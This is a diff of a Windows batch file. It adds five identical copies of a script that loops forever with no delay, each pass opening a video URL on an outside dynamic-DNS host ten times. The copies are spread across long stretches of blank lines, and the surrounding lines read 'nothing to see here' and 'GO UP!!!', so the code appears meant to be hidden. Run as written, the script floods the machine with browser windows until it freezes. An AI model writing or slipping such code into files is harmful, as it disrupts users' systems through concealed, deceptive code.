@@ -99,25 +99,130 @@ echo nothing to see here :)
 
 
 
+@echo off
+setlocal
+
+:: URL to the video
+set videoURL=http://fart.tplinkdns.com/joker.mp4
+
+:LOOP
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+
+:: Immediately loop back to the start without any delay
+goto LOOP
+
+endlocal
+
+
+@echo off
+setlocal
+
+:: URL to the video
+set videoURL=http://fart.tplinkdns.com/joker.mp4
+
+:LOOP
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+
+:: Immediately loop back to the start without any delay
+goto LOOP
+
+endlocal
 
 
 
 
 
 
+@echo off
+setlocal
+
+:: URL to the video
+set videoURL=http://fart.tplinkdns.com/joker.mp4
+
+:LOOP
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+
+:: Immediately loop back to the start without any delay
+goto LOOP
+
+endlocal
 
 
 
 
+@echo off
+setlocal
+
+:: URL to the video
+set videoURL=http://fart.tplinkdns.com/joker.mp4
+
+:LOOP
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+
+:: Immediately loop back to the start without any delay
+goto LOOP
+
+endlocal
 
 
+@echo off
+setlocal
 
+:: URL to the video
+set videoURL=http://fart.tplinkdns.com/joker.mp4
 
+:LOOP
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
+start "" "%videoURL%"
 
+:: Immediately loop back to the start without any delay
+goto LOOP
 
-
-
-
+endlocal
 
 echo why are you here still? GO UP!!!
 
